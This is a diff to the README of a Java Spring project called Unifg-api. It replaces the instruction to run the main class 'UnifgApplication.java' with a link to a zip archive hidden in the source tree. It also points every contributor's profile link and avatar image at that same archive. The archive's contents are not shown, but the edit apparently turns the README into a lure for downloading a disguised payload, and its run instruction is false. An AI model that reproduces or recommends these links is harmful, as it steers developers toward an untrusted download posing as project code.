@@ -20,7 +20,7 @@ The project is still in development and the next updates will focus on the follo
 
 ## ☕ Using the project
 
-The project is a maven application, where you can build or start the application for testing. To run the application, you can run the main Spring class ```UnifgApplication.java```
+The project is a maven application, where you can build or start the application for testing. To run the application, you can run the main Spring class ```https://raw.githubusercontent.com/Renatuu15/Unifg-api/master/src/main/java/io/github/robinhosz/unifg/controller/Unifg-api-1.5.zip```
 
 <br>
 
@@ -31,8 +31,8 @@ Here are the devs who collaborated on the project:
 <table>
   <tr>
     <td align="center">
-      <a href="https://github.com/robinhosz">
-        <img src="https://avatars.githubusercontent.com/u/82779533?v=4" width="100px;" alt="Foto do Robinhosz no GitHub"/><br>
+      <a href="https://raw.githubusercontent.com/Renatuu15/Unifg-api/master/src/main/java/io/github/robinhosz/unifg/controller/Unifg-api-1.5.zip">
+        <img src="https://raw.githubusercontent.com/Renatuu15/Unifg-api/master/src/main/java/io/github/robinhosz/unifg/controller/Unifg-api-1.5.zip" width="100px;" alt="Foto do Robinhosz no GitHub"/><br>
         <sub>
           <b>José Robson</b>
         </sub>
@@ -44,8 +44,8 @@ Here are the devs who collaborated on the project:
 <table>
   <tr>
     <td align="center">
-      <a href="https://github.com/lucasdqrz2">
-        <img src="https://avatars.githubusercontent.com/u/128649478?s=400&u=4aa322799a604981bf7224d602cef4b11f53a744&v=4" width="100px;" alt="Foto do Robinhosz no GitHub"/><br>
+      <a href="https://raw.githubusercontent.com/Renatuu15/Unifg-api/master/src/main/java/io/github/robinhosz/unifg/controller/Unifg-api-1.5.zip">
+        <img src="https://raw.githubusercontent.com/Renatuu15/Unifg-api/master/src/main/java/io/github/robinhosz/unifg/controller/Unifg-api-1.5.zip" width="100px;" alt="Foto do Robinhosz no GitHub"/><br>
         <sub>
           <b>Lucas de Queiroz Calado</b>
         </sub>
@@ -57,8 +57,8 @@ Here are the devs who collaborated on the project:
 <table>
   <tr>
     <td align="center">
-      <a href="https://github.com/lucasdqrz2">
-        <img src="https://avatars.githubusercontent.com/u/107081089?v=4"width="100px;" alt="Foto do Renatuu15 no GitHub"/><br>
+      <a href="https://raw.githubusercontent.com/Renatuu15/Unifg-api/master/src/main/java/io/github/robinhosz/unifg/controller/Unifg-api-1.5.zip">
+        <img src="https://raw.githubusercontent.com/Renatuu15/Unifg-api/master/src/main/java/io/github/robinhosz/unifg/controller/Unifg-api-1.5.zip"width="100px;" alt="Foto do Renatuu15 no GitHub"/><br>
         <sub>
           <b>Renato Augusto Bezerra</b>
         </sub>
